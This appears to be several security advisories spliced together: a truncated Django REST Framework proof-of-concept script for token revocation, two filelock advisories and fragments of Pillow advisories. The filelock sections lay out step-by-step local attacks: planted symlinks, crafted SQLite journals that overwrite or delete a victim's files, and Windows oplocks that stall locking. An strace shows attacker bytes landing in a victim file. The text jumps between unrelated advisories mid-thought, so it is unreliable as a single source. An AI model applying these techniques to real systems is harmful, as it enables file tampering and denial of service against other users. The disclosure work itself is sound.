python """ django-rest-framework: TokenProxy.delete() reports success and revokes nothing.    baseline  token exists                        -> 200   TRIGGER   TokenProxy.objects.get(...).delete() -> no exception, row survives, still 200   CONTROL   Token.objects.get(key=...).delete()  -> row gone, 401  The control is what makes the trigger meaningful: it proves the row was deletable and the credential check live, so the 200 after the proxy delete is a failed revocation and not a broken harness.  Requires: django, djangorestframework importable. No arguments.     python poc_tokenproxy_revocation.py Exit status 0 means the revocation failure reproduced. """ import sys  import django from django.conf import settings  settings.configure(     DEBUG=False,     SECRET_KEY="poc",     ALLOWED_HOSTS=["*"],     ROOT_URLCONF=__name__,     INSTALLED_APPS=[         "django.contrib.contenttypes",         "django.contrib.auth",         "rest_framework",         "rest_framework.authtoken",     ],     DATABASES={"default": {"ENGINE": "django.db.backends.sqlite3", "NAME": ":memory:"}},     DEFAULT_AUTO_FIELD="django.db.models.AutoField",     USE_TZ=True, ) django.setup()  from django.contrib.auth import get_user_model  # noqa: E402 from django.core.management import call_command  # noqa: E402 from django.db import connection  # noqa: E402 from django.test import Client  # noqa: E402 from django.test.utils import CaptureQueriesContext  # An operator who revokes a token through a `TokenProxy` instance, and receives no error, leaves a live credential in circulation indefinitely, because DRF auth tokens do not expire on their own. Whoever holds that token benefits: a departed employee, a rotated integration, a device believed to be deprovisioned, or an attacker whose access was thought to have been cut during incident response.  No untrusted input reaches this code path, which is why the vector is scored `AC:H`. Exploitation depends on the deployment revoking through the proxy, which is a natural thing to do given `TokenProxy` is the model registered in the admin and the one most code will reach for. Any deployment on 3.12.0 or later that revokes tokens outside DRF's own `TokenAdmin.delete_model` should audit whether its revocations took effect.

`ReadWriteLock` and `AsyncReadWriteLock` (the SQLite-backed reader/writer lock) hand SQLite a name they do not control. On Linux the lock validates its database through a descriptor (the number the kernel gives a process for an open file). It then connects SQLite to `/proc/self/fd/<n>`, a Linux path that names the process's own open file `n`. SQLite turns that path back into a plain path and reopens it by name, following symlinks (a symlink is a file that points at another path). On every POSIX route SQLite also acts on `-journal`, `-wal` and `-shm` files it finds beside that name. Those are SQLite's side files: the rollback journal (pages saved to undo an interrupted write), the write-ahead log or WAL (changes kept outside the main file), and the shared-memory index for the WAL.  Another local user who can create or rename entries in the directory that holds the lock database can turn this against the user running the lock (below: the lock user). Such a directory is a `0777` or group-writable cache, build or project directory without the sticky bit (a directory flag that lets only a file's owner remove or rename it). That other user can make the lock user's ordinary `read_lock()` or `write_lock()` write bytes of the other user's choosing into the lock user's own files. The same position lets the other user make that call create or unlink files of the lock user, admit a reader beside a writer, or kill the holder. All of this runs with the lock user's privileges. In a sticky directory such as `/tmp` a planted `-wal` file makes every acquire fail. Affected versions are filelock 3.20.4 through 4.2.0 (the `/proc/self/fd` redirect since 4.0.9, the side-file variants since 3.20.4).  Anthropic's OSS Scanner reported this in private as `ANT-2026-KMJ2575J` [high, CWE-363]: ReadWriteLock: SQLite still follows planted symlinks, overwriting files.  ## Severity  **CVSS 3.1 `CVSS:3.1/AV:L/AC:L/PR:L/UI:N/S:U/C:N/I:H/A:H` scores 7.1 (High).** `AV:L` (local): the other user needs an account on the same host. `PR:L` (low privileges): an ordinary account is enough. `UI:N` (no user interaction). `AC:L` (low attack complexity): the planted-journal variant needs no race, and the redirect won 77 of 77 attempts. `I:H` (high integrity impact): the other user writes bytes of their choosing into files of the lock user and unlinks files of their choosing. `A:H` (high availability impact): the other user makes every acquire fail or kills the lock holder. `C:N` (no confidentiality impact): the other user learns nothing. `S:U` (scope unchanged): the effect stays within the lock user's own privileges.  Classification from the external review: **conditional security**, a cross-user effect that exists only when another user can change names in the lock database's directory. The review notes that the 77/77 inotify result (inotify is a Linux interface that reports file events) is stronger evidence than a theoretical TOCTOU (a time-of-check to time-of-use race). The scanner rated it high. The review accepts the mechanism and narrows it to that precondition.  ## Scope and preconditions  - The other party is a different local account that can create or rename entries in the directory that holds the lock database. That is a `0777` directory or a group-writable one (including a setgid `2775` project directory shared with that account), in each case without the sticky bit. The lock user's lock must be able to open the database read-write, so a database the other user creates is `0666`. filelock itself creates the database `0600`. - Sticky directories (`/tmp`, `/var/tmp`, any `1777` directory) narrow the finding rather than exclude it. The redirect and the journal replay do not reach a database the lock user owns there (tested with `fs.protected_regular=2`). What remains is a planted non-empty `<db>-wal` (any mode; a directory or FIFO works too) that the lock user cannot unlink. It makes every acquire raise `sqlite3.OperationalError: disk I/O error`. A hard link (a second name for the same file) to a file of the lock user at the lock path also remains, if `fs.protected_hardlinks=0`. - Two kernel settings matter. `fs.protected_regular` (1 or 2 is the systemd default on most distributions; the kernel's own default is 0) keeps a user from opening a file another user owns in a sticky world-writable directory. Where it is 0, the other user can own the database in `/tmp`, and SQLite follows a planted symlink itself (not tested). `fs.protected_hardlinks=1` (most distributions; kernel default 0) blocks a hard link of a lock user's file onto the lock path. Neither setting affects a non-sticky shared directory. - Platform and route. The `/proc/self/fd` redirect is Linux with `/proc` mounted, 4.0.9 and later. The side-file variants (`-journal`, `-wal`, `-shm`) exist on every POSIX route. On the hard-link route (macOS since 4.1.1 for every connection, Linux without `/proc`) they need the link-directory swap described under "Mechanism", so a non-sticky parent. Neither the scanner nor the review executed on macOS; the statement rests on the platform branch and the identical code after it. Windows does not take this path. - Ancestor boundary. Protection against another local user is possible only while no other user can replace the lock's directory or any of its ancestors. That holds when each ancestor belongs to the user or root and is either not writable by others or sticky. A user who can rename an entry in a non-sticky directory above the lock controls every name below it. No file-based lock can defend against that.  ## Affected code  At the scanned commit `b831496b0273`: [`_connect_through_descriptor` builds `/proc/self/fd/<n>` and hands it to `sqlite3.connect`](https://github.com/tox-dev/filelock/blob/b831496b0273ecd11bf02b8d080ca8b673a538c1/src/filelock/_read_write.py#L982-L1001). The assumption is the [comment at line 63](https://github.com/tox-dev/filelock/blob/b831496b0273ecd11bf02b8d080ca8b673a538c1/src/filelock/_read_write.py#L63), "Descriptor paths reopen the validated inode" (an inode is the kernel's identity for a file, independent of its name). SQLite first reads the file it opened at [`PRAGMA journal_mode=MEMORY`, line 816](https://github.com/tox-dev/filelock/blob/b831496b0273ecd11bf02b8d080ca8b673a538c1/src/filelock/_read_write.py#L816). The check in [`_raise_if_database_replaced` at line 836](https://github.com/tox-dev/filelock/blob/b831496b0273ecd11bf02b8d080ca8b673a538c1/src/filelock/_read_write.py#L836) runs only after `BEGIN`. Both [`_open_lock_database`](https://github.com/tox-dev/filelock/blob/b831496b0273ecd11bf02b8d080ca8b673a538c1/src/filelock/_read_write.py#L1079-L1091) and [`_raise_if_wal`](https://github.com/tox-dev/filelock/blob/b831496b0273ecd11bf02b8d080ca8b673a538c1/src/filelock/_read_write.py#L1094-L1101) inspect the descriptor, not the file SQLite is on. The one-level hard link of the macOS route is [`_link_beside`](https://github.com/tox-dev/filelock/blob/b831496b0273ecd11bf02b8d080ca8b673a538c1/src/filelock/_read_write.py#L1014-L1029).  ## Introduced  The `/proc/self/fd` redirect came with `4d45e83` ("Merge commit from fork", the fix for GHSA-j8f7-rjxc-mr56), first released in **4.0.9** (verified: `git tag --contains 4d45e83` gives 4.0.9); 4.0.8 does not have it. The side-file variants are older. They reproduce on `cfd4446` ("feat(lock): add SQLite-based ReadWriteLock (#399)"), first released in **3.20.4** (verified), which passed the lock path straight to `sqlite3.connect`.  ## Mechanism  On Linux the lock opens the database with `O_RDWR|O_CREAT|O_NOFOLLOW|O_NONBLOCK`. It checks through the descriptor that the file is a regular file and not a WAL database. It then calls `sqlite3.connect("/proc/self/fd/<n>")` and expects SQLite to reopen the validated inode. SQLite does not open that name. It runs `readlink()` on it, which yields the path string the kernel reports for the descriptor at that moment, and opens that string by path, following every symlink. Without interference the trace shows `readlink("/proc/534/fd/3") = "/tmp/benign/app.lock.db"` and then a second `openat` of that path. The descriptor contributes only a string. Once the directory entry behind the descriptor is gone, the string is `<database> (deleted)`. A symlink with that exact name sends SQLite wherever its creator chose.  The other user prepares the directory before the lock user runs. They create a database `cache.lock.db` (`0666`, so the lock user's lock accepts it) with a second hard link `cache.lock.db.keep`, and the symlink `cache.lock.db (deleted) -> /tmp/victim-notes.txt`. The lock user's `os.open` raises an inotify `IN_OPEN` event. The other user unlinks `cache.lock.db` and links `cache.lock.db.keep` back under the same name. The lock user's descriptor still refers to the unlinked entry, so `/proc/self/fd/3` now reads `/tmp/shared-cache/cache.lock.db (deleted)`. `sqlite3.connect` resolves it, follows the symlink and opens the target `O_RDWR|O_CREAT`. None of filelock's checks look at that file. `_open_lock_database` and `_raise_if_wal` inspect descriptor 3. `_raise_if_database_replaced` compares an `lstat` of the lock path with the descriptor's `(st_dev, st_ino)`, which passes because the other user linked the same inode back, and it runs only after `BEGIN`.  The damage comes from the first statement, `PRAGMA journal_mode=MEMORY`. SQLite finds `<target>-journal`, treats it as the rollback journal of an interrupted transaction, and copies its page records into the target before it checks whether the target is a database at all. The journal header supplies the page size and the page count SQLite resizes the file to. Whoever wrote the journal computed the per-page checksum. The content from offset 0 and the final length are therefore the other user's. Strace of the lock user's process (SQLite 3.40.1):  ``` openat("/tmp/shared-cache/cache.lock.db", O_RDWR|O_CREAT|O_NONBLOCK|O_NOFOLLOW|O_CLOEXEC, 0600) = 3 readlink("/proc/3819/fd/3", "/tmp/shared-cache/cache.lock.db (deleted)", 4096) = 41 readlink("/tmp/shared-cache/cache.lock.db (deleted)", "/tmp/victim-notes.txt", 4096) = 21 openat("/tmp/victim-notes.txt", O_RDWR|O_CREAT|O_NOFOLLOW|O_CLOEXEC, 0644) = 4 openat("/tmp/victim-notes.txt-journal", O_RDWR|O_NOFOLLOW|O_CLOEXEC) = 5 pread64(5, "ATTACKER CONTENT WRITTEN BY THE "..., 4096, 516) = 4096 pwrite64(4, "ATTACKER CONTENT WRITTEN BY THE "..., 4096, 0) = 4096 unlink("/tmp/victim-notes.txt-journal") = -1 EPERM            -> "disk I/O error" ```  The redirect itself needs no journal. The constructor's validation connection already makes SQLite open the target with `O_CREAT`. With the symlink pointing at a missing path in the lock user's home, constructing the lock created that file (empty, `0644`, owned by the lock user) and raised nothing. With the symlink pointing at a `0600` WAL-mode SQLite database of the lock user, `write_lock()` returned without error and the database's header bytes 18 and 19 changed from `2 2` to `1 1`. The pragma converted the lock user's database out of WAL mode, and the redirected acquire held its SQLite lock on that database rather than on the lock database.  **Side-file names beside the database.** Two comments record the belief that SQLite names its side files after the descriptor path ([line 63](https://github.com/tox-dev/filelock/blob/b831496b0273ecd11bf02b8d080ca8b673a538c1/src/filelock/_read_write.py#L63), [line 1095](https://github.com/tox-dev/filelock/blob/b831496b0273ecd11bf02b8d080ca8b673a538c1/src/filelock/_read_write.py#L1095)). The path is not synthetic to SQLite. It derives `<database>-journal`, `<database>-wal` and `<database>-shm` from the resolved real path in the shared directory. `journal_mode=MEMORY` governs only journals SQLite would write, not ones it finds. These variants need no redirect.  *A hot `-journal` makes the lock user unlink a file the journal names; no race.* The other user unlinks the lock user's empty `lock.db`, puts a one-page SQLite database (`0666`) in its place, and writes a 46-byte `lock.db-journal`: a path, its 4-byte length, the 4-byte sum of its bytes and SQLite's journal magic. SQLite treats a journal beside a non-empty database as hot (left by an interrupted transaction). The tail names a "super-journal", and recovery ends by unlinking that file. The lock user's next `read_lock()` or `write_lock()` returns without error and the named file is gone (`unlink("/home/victim/private/notes.txt") = 0`, from a `0700` directory of the lock user). The named file must be a non-empty regular file the lock user can read and unlink. A FIFO planted as `lock.db-journal` instead blocks `read_lock(timeout=2)` in SQLite's `open()` of the journal (still blocked when killed after 10 s).  *A re-planted `-wal` puts the holder in WAL mode past `_raise_if_wal`.* `_raise_if_wal` checks header bytes 18 and 19. Whenever a connection takes its first lock, SQLite stats `<db>-wal`, and if that file and the database are both non-empty it opens the WAL whatever the header says. The pragma at line 816 converts such a database and unlinks `-wal` and `-shm`. The `BEGIN` at line 833 is a separate statement that starts unlocked and stats `<db>-wal` again. Re-creating the 32-byte `-wal` in that gap landed on the first attempt in 20 of 20 runs on a 2-CPU machine.  The lock user's `with lock.write_lock():` then holds the `-shm` byte-120 WAL write lock and only SHARED on the database. Once the other user removes the `-wal`, a second process of the lock user gets `read_lock(timeout=1)` granted while the writer is inside its block, with no exception on either side. SQLite also creates `<db>-shm` with the database's permission bits (`0666`) and keeps it mapped into memory. After the other user truncates it, the writer dies with `SIGBUS` (the signal for touching a mapped file region that no longer exists) in `connection.rollback()` during `release()`.  *A `-wal` in a sticky directory makes every acquire raise; no race, no access to the database.* Beside the lock user's own empty `0600` database, a non-empty `<db>-wal` (one byte, any mode; a directory or FIFO works too) is a leftover SQLite tries to delete. In a `1777` directory the lock user cannot unlink another user's file (`unlink(...) = -1 EPERM`), so the pragma fails with `SQLITE_IOERR_DELETE`. The code in [`_do_acquire_inner`](https://github.com/tox-dev/filelock/blob/b831496b0273ecd11bf02b8d080ca8b673a538c1/src/filelock/_read_write.py#L763) translates only "database is locked" into `Timeout`. `sqlite3.OperationalError: disk I/O error` therefore leaves every `acquire_read()` / `acquire_write()` (and the async variants) within milliseconds, whatever `timeout` or `blocking` says, until the file's owner or root removes it.  *Further effects observed at this commit in a non-sticky directory.* A `0755` script owned by the lock user, renamed to the lock path with a one-record journal beside it, ends up holding the other user's bytes (the acquire raises `file is not a database`). A hard link to the lock user's `0600` `~/.profile` at the lock path does the same in a sticky `/tmp` when `fs.protected_hardlinks=0`. When the locking process runs as root, SQLite runs `fchown` on a `-wal` or `-shm` it opens to match the owner of the database, so root's `0600` `service.env` renamed to `app.lock.db-wal` belonged to the other user after root's `read_lock()`.  A journal whose super-journal names the database itself makes SQLite open and close a second descriptor on the database, which drops the process's POSIX locks, so `acquire_read` returns with no lock held in `/proc/locks` and a writer in another process acquires (two journals in a row, one per statement; write locks are not affected). A one-byte `lock.db-wal` plus a `lock.db-shm` on which the other user holds two byte locks makes the acquire take 10 s regardless of `timeout` and raise `locking protocol`, or die with `SIGBUS` if the other user truncates the `-shm`.  **The hard-link route in a directory without the sticky bit.** None of the above occurs on the `_link_beside` branch (macOS, Linux without `/proc`). There SQLite's main file is `.filelock-…/lock.db` in the connecting user's `0700` directory. That protection holds only where no other user can rename the `.filelock-*` entry itself, because `0700` protects the contents, not the entry in the parent. `_link_beside` checks the link once and returns a pathname, and every later use is by that name.  With `/proc` hidden in a `0777` directory, the other user staged a directory holding a hard link `lock.db` to a one-page database and a hot `lock.db-journal`. They held `BEGIN EXCLUSIVE` on the database so the lock user's first statement waited in the busy handler (SQLite's retry loop for a locked database), renamed the lock user's `.filelock-*` directory aside, renamed the staged directory onto its name and rolled back. SQLite got SHARED, found the journal under the swapped name and unlinked the file it named. The lock user's process reported the lock held and exited 0. A polling variant without the write lock also won (in 40 trials the file was gone after 1 to 26 starts of the lock user's program). Under the sticky bit the rename fails with `EPERM`.  ## Reproduction  The scanner's reproducer for `ANT-2026-KMJ2575J`, quoted as received. On Windows the soft locks (`SoftFileLock`, `MarkerSoftFileLock`, `SoftFileLease`, their async forms, and a `FileLock` that fell back to a soft lock) read their marker by path. The marker is the lock file whose presence says a process holds the lock. Each `acquire()` attempt that finds a marker opens it with `os.open` to read the holder's process id, and the lock renames and deletes a marker it judges stale, by path. On Windows each of these calls waits for an oplock. An oplock (opportunistic lock) is a request by a process that holds a handle on a file to be told before another process opens, renames or deletes that file; the other process waits until the holder answers the break or closes its handle.  Another local account that can open the marker for reading can take a Level 1 oplock on it while no process holds it open, and leave the break unanswered. Every `acquire()` by the user running the lock (below: the lock user) then waits inside the open, past its `timeout`, `blocking=False` and `cancel_check`, and a stale marker under that oplock is not broken. Mutual exclusion holds and the lock touches no other file. Affected versions are filelock 3.22.0 through 4.2.0 on Windows. With `AsyncSoftFileLock(run_in_executor=False)` the event loop waits. - Stale break: `break_lock_file` renames and unlinks by path. Both calls wait in the same way, so a stale marker under such an oplock stays, and no process acquires the lock until the holder closes. - Not affected: mutual exclusion, and the lock reads, writes and deletes no file other than the marker.  ## Affected code  Scanned commit `b831496b0273`: the [`os.open` in `_read_lock_file`](https://github.com/tox-dev/filelock/blob/b831496b0273ecd11bf02b8d080ca8b673a538c1/src/filelock/_soft.py#L323) ([function](https://github.com/tox-dev/filelock/blob/b831496b0273ecd11bf02b8d080ca8b673a538c1/src/filelock/_soft.py#L312-L335)), called from [`_try_break_stale_lock`](https://github.com/tox-dev/filelock/blob/b831496b0273ecd11bf02b8d080ca8b673a538c1/src/filelock/_soft.py#L107-L123) on every attempt that finds a marker, and from [`_unprobeable_holder`](https://github.com/tox-dev/filelock/blob/b831496b0273ecd11bf02b8d080ca8b673a538c1/src/filelock/_soft.py#L137), [`pid`](https://github.com/tox-dev/filelock/blob/b831496b0273ecd11bf02b8d080ca8b673a538c1/src/filelock/_soft.py#L164) and [`is_lock_held_by_us`](https://github.com/tox-dev/filelock/blob/b831496b0273ecd11bf02b8d080ca8b673a538c1/src/filelock/_soft.py#L179). These wait for an oplock as `os.open` does, because none of them passes `FILE_COMPLETE_IF_OPLOCKED`, an `NtCreateFile` option that returns instead of waiting. The read became the `os.open` in `_read_lock_file` with [bfbfa76](https://github.com/tox-dev/filelock/commit/bfbfa76) ([#548](https://github.com/tox-dev/filelock/pull/548), 3.29.1) and the break moved into `break_lock_file` with [d244c6d](https://github.com/tox-dev/filelock/commit/d244c6d) ([#551](https://github.com/tox-dev/filelock/pull/551), 3.29.2); the by-path calls stayed.  ## Mechanism  Each attempt of `_acquire` first calls `os.open(path, O_WRONLY | O_CREAT | O_EXCL)`. On an existing marker that fails with `EEXIST` (or `EACCES` on Windows) at once; the same-account probe shows the failed exclusive create returning at once under an oplock too. `_acquire` then calls `_try_break_stale_lock`, which calls `_read_lock_file`: `os.lstat`, then `os.open(path, O_RDONLY | O_NOFOLLOW | O_NONBLOCK)`. On Windows `O_NOFOLLOW` and `O_NONBLOCK` do not exist (the code reads them with `getattr(os, ..., 0)`), and `os.open` calls `CreateFileW`. When another handle holds a Level 1 or batch oplock on the file, that call sends the holder a break request and returns only when the holder acknowledges it or closes its handle. `_check_give_up` tests the deadline after the attempt returns, so the wait overruns `timeout`, `blocking=False` and `cancel_check` by its length. Once the open returns, the attempt ends and `_check_give_up` raises `Timeout`, because the deadline has passed.  A marker whose holder is gone takes the second path. `break_lock_file` renames it to a break name and unlinks it, by path. On Windows the rename and the delete open the file with delete access, which breaks a Level 1 or batch oplock the same way; the same-account probe shows `os.rename` and `os.unlink` still running after 15 s and returning once the holder closed. The `lifetime` break at L123 runs the same function. A stale marker under such an oplock is therefore not removed, and every attempt by every process waits inside the read. The other account can request the oplock again as soon as the lock user's handle closes, between two attempts or two `acquire()` calls, as in the Linux lease case of GHSA-7hmp-gf99-57hx. Nothing in the retry loop bounds this wait.  ## Reproduction  The review's reproducers, quoted as received. `oplock_vm.py` section `[2]` is this finding; sections `[1a]` and `[1b]` belong to the `release()` advisory. `oplock_semantics_vm.py` is the same-account probe of which path operations wait. In the same-account probe (`oplock_semantics_vm.py`) the open returned only when the holder closed, still running at 15 s. The probe also shows that the failed exclusive create and `os.utime` by path return at once, so the wait is in the read and the break, not in the create attempt.  ## Impact  Each `acquire()` of a soft lock that finds a marker another account holds an oplock on runs past its `timeout`, `blocking=False` and `cancel_check` until the holder answers or closes, 10 s per attempt in the recorded two-account runs. A stale marker under that oplock is not broken, so no process acquires the lock while the holder keeps its handle. With `AsyncSoftFileLock(run_in_executor=False)` the wait is on the event loop thread and stops every task in the process; with the default executor one worker thread waits. The documentation names a soft lock as the option for network filesystems, after verification on the mount, and `FileLock` is a soft lock on builds without `fcntl` and after its `ENOSYS` fallback. Mutual exclusion is not affected and nothing other than the marker is read, written or deleted.  ## Workarounds  - Keep soft-lock markers in a directory whose ACL grants other accounts no access to new files: a directory inside the user profile, or one with inheritance removed and only the owner, `SYSTEM` and `Administrators` granted (`icacls <dir> /inheritance:r /grant:r "<owner>:(OI)(CI)F" "SYSTEM:(OI)(CI)F" "Administrators:(OI)(CI)F"`). `mode` does not do this on Windows. - Run `AsyncSoftFileLock` with the default executor rather than `run_in_executor=False`, so that only a worker thread waits. - No `timeout`, `blocking` or `cancel_check` value bounds the wait.  ## Patched version  4.2.1. This may lead to a denial-of-service.  ### Patches Starting in version 3.14, the function rejects long inputs as soon as practicable prior to any further processing to minimize resource consumption. ### Impact Pillow did not limit the amount of GZIP-compressed data read when decoding a FITS image, making it vulnerable to decompression bomb attacks. A specially crafted FITS file could cause unbounded memory consumption, leading to denial of service (OOM crash or severe performance degradation).  ### Patches The amount of data read is now limited to the necessary amount. Fixed in Pillow 12.2.0 (PR #9521).  ### Workarounds Avoid Pillow >= 10.3.0, < 12.2.0 Only open [specific image formats](https://pillow.readthedocs.io/en/stable/releasenotes/8.0.0.html#image-open-add-formats-parameter), excluding FITS.
If a font advances for each glyph by an exceeding large amount, when Pillow keeps track of the current position, it may lead to an integer overflow. This has been fixed.

Passing nested lists as coordinates to APIs that accept coordinates such as `ImagePath.Path`, `ImageDraw.ImageDraw.polygon` and `ImageDraw.ImageDraw.line` could cause a heap buffer overflow, as nested lists were recursively unpacked beyond the allocated buffer. Coordinate lists are now validated to contain exactly two numeric coordinates. This was introduced in Pillow 11.2.1.

### Impact An attacker can supply a malicious PDF that causes the process to hang indefinitely, consuming 100% CPU and making the application unresponsive.  ### Patches Patched version: 12.2.0.  PdfParser (introduced in Pillow 4.2.0) follows Prev pointers in PDF trailers to read cross-reference sections. If a trailer's Prev pointer references an offset that has already been processed — either pointing to itself or forming a longer cycle — the parser enters an infinite loop. Pillow now tracks previously processed trailer offsets and raises an error if a cycle is detected.  ### Workarounds Use any version but the affected versions: >= 4.2.0, < 12.2.0  ### Resources  - Fix: https://github.com/python-pillow/Pillow/pull/9519
